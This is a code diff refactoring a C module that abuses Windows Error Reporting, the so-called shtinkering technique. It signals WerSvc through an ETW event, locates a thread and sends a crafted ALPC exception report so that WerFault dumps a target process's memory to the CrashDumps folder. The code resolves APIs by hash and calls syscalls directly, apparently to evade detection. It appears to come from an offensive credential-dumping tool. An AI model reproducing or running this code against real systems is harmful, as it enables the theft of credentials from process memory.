@@ -1,48 +1,6 @@
 #include "shtinkering.h"
 
 
-BOOL print_crash_location(VOID)
-{
-    BOOL ret_val = FALSE;
-    DWORD bufferSize = 300;
-    GetEnvironmentVariableW_t GetEnvironmentVariableW = NULL;
-    LPWSTR env_var = NULL;
-
-    env_var = intAlloc(bufferSize);
-    if (!env_var)
-    {
-        malloc_failed();
-        goto cleanup;
-    }
-
-    GetEnvironmentVariableW = (GetEnvironmentVariableW_t)(ULONG_PTR)get_function_address(
-        get_library_address(KERNEL32_DLL, TRUE),
-        GetEnvironmentVariableW_SW2_HASH,
-        0);
-    if (!GetEnvironmentVariableW)
-    {
-        api_not_found("GetEnvironmentVariableW");
-        goto cleanup;
-    }
-
-    bufferSize = GetEnvironmentVariableW(L"LocalAppData", env_var, bufferSize);
-    if (!bufferSize)
-    {
-        DPRINT_ERR("Retrieving LocalAppData failed");
-        goto cleanup;
-    }
-
-    PRINT("Crash dumps directory: %ls\\CrashDumps\\", env_var);
-
-    ret_val = TRUE;
-
-cleanup:
-    if (env_var)
-        intFree(env_var);
-
-    return ret_val;
-}
-
 BOOL cleanup_registry_key(
     IN HANDLE hRegistry)
 {
@@ -220,8 +178,8 @@ BOOL signal_start_wersvc(VOID)
         }
 
         GUID feedbackServiceTriggerProviderGuid = { 0xe46eead8, 0xc54, 0x4489, {0x98, 0x98, 0x8f, 0xa7, 0x9d, 0x5, 0x9e, 0xe} };
-        EVENT_DESCRIPTOR eventDescriptor;
-        RtlZeroMemory(&eventDescriptor, sizeof(EVENT_DESCRIPTOR));
+        EVENT_DESCRIPTOR eventDescriptor = { 0 };
+        memset(&eventDescriptor, 0, sizeof(EVENT_DESCRIPTOR));
         status = EtwEventWriteNoRegistration(
             &feedbackServiceTriggerProviderGuid,
             &eventDescriptor,
@@ -336,7 +294,7 @@ BOOL find_valid_thread_id(
     IN DWORD process_id,
     OUT PDWORD pthread_id)
 {
-    BOOL success = FALSE;
+    BOOL ret_val = FALSE;
     NTSTATUS status = STATUS_UNSUCCESSFUL;
     HANDLE hProcess = NULL;
     HANDLE hThread = NULL;
@@ -363,8 +321,7 @@ BOOL find_valid_thread_id(
         THREAD_QUERY_LIMITED_INFORMATION,
         0,
         0,
-        &hThread
-        );
+        &hThread);
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtGetNextThread", status);
@@ -372,8 +329,10 @@ BOOL find_valid_thread_id(
     }
 
     *pthread_id = get_tid(hThread);
-    if (*pthread_id)
-        success = TRUE;
+    if (!*pthread_id)
+        goto cleanup;
+
+    ret_val = TRUE;
 
 cleanup:
     if (hProcess)
@@ -381,7 +340,7 @@ cleanup:
     if (hThread)
         NtClose(hThread);
 
-    return success;
+    return ret_val;
 }
 
 BOOL werfault_shtinkering(
@@ -403,6 +362,7 @@ BOOL werfault_shtinkering(
     OBJECT_ATTRIBUTES attr_inheritable = { 0 };
     CLIENT_ID cid = { 0 };
     HANDLE hRegistry = NULL;
+    PReportExceptionWerAlpcMessage receivingMessage = NULL;
 
     // Create exception details
     EXCEPTION_RECORD exceptionRecord = { 0 };
@@ -419,14 +379,24 @@ BOOL werfault_shtinkering(
     InitializeObjectAttributes(&attr_inheritable, NULL, OBJ_INHERIT, 0, NULL);
 
     // Create hRecoveryEVent & hCompletionEvent
-    status = NtCreateEvent(&hRecoveryEvent, GENERIC_ALL, &attr_inheritable, FALSE, FALSE);
+    status = NtCreateEvent(
+        &hRecoveryEvent,
+        GENERIC_ALL,
+        &attr_inheritable,
+        FALSE,
+        FALSE);
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateEvent", status);
         goto cleanup;
     }
 
-    status = NtCreateEvent(&hCompletionEvent, GENERIC_ALL, &attr_inheritable, FALSE, FALSE);
+    status = NtCreateEvent(
+        &hCompletionEvent,
+        GENERIC_ALL,
+        &attr_inheritable,
+        FALSE,
+        FALSE);
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateEvent", status);
@@ -514,9 +484,14 @@ BOOL werfault_shtinkering(
     sendingMessage.TargetProcessId = mps.TargetProcessPid;
 
     // Prepare the ALPC response
-    ReportExceptionWerAlpcMessage receivingMessage = { 0 };
-    receivingMessage.PortMessage.u1.s1.TotalLength = sizeof(ReportExceptionWerAlpcMessage);
-    receivingMessage.PortMessage.u1.s1.DataLength = sizeof(ReportExceptionWerAlpcMessage) - sizeof(PORT_MESSAGE);
+    receivingMessage = intAlloc(sizeof(ReportExceptionWerAlpcMessage));
+    if (!receivingMessage)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+    receivingMessage->PortMessage.u1.s1.TotalLength = sizeof(ReportExceptionWerAlpcMessage);
+    receivingMessage->PortMessage.u1.s1.DataLength = sizeof(ReportExceptionWerAlpcMessage) - sizeof(PORT_MESSAGE);
 
     // Copy the struct into the mapped view
     memcpy(mappedView, &mps, sizeof(mps));
@@ -524,7 +499,7 @@ BOOL werfault_shtinkering(
     // Send the request and get the response from the ALPC server
     success = send_message_to_wer_service(
         &sendingMessage,
-        &receivingMessage);
+        receivingMessage);
 
     // Did we fail to send the ALPC message?
     if (!success)
@@ -533,20 +508,20 @@ BOOL werfault_shtinkering(
     }
 
     // Did the operation not succeed on WerSvc side?
-    if (!NT_SUCCESS(receivingMessage.NtStatusErrorCode))
+    if (!NT_SUCCESS(receivingMessage->NtStatusErrorCode))
     {
-        DPRINT_ERR("receivingMessage.NtStatusErrorCode is 0x%lx", receivingMessage.NtStatusErrorCode);
+        DPRINT_ERR("receivingMessage->NtStatusErrorCode is 0x%lx", receivingMessage->NtStatusErrorCode);
         goto cleanup;
     }
 
     // Check if message type indicates failure
-    if (ReplyReportUnhandledExceptionFailure != receivingMessage.MessageType)
+    if (ReplyReportUnhandledExceptionFailure != receivingMessage->MessageType)
     {
-        DPRINT_ERR("receivingMessage.MessageType is 0x%lx", receivingMessage.NtStatusErrorCode);
+        DPRINT_ERR("receivingMessage->MessageType is 0x%lx", receivingMessage->NtStatusErrorCode);
         goto cleanup;
     }
 
-    hWerfault = (HANDLE)(ULONG_PTR)receivingMessage.Flags;
+    hWerfault = (HANDLE)(ULONG_PTR)receivingMessage->Flags;
     if (!hWerfault)
     {
         goto cleanup;
@@ -571,7 +546,7 @@ BOOL werfault_shtinkering(
 
     }
 
-    success = print_crash_location();
+    success = print_shtinkering_crash_location();
     if (!success)
     {
         DPRINT_ERR("Failed to print the crash directory");
@@ -604,6 +579,8 @@ cleanup:
         NtClose(hRegistry);
         DPRINT("cleaned the registry key");
     }
+    if (receivingMessage)
+        intFree(receivingMessage);
 
     return ret_val;
 }
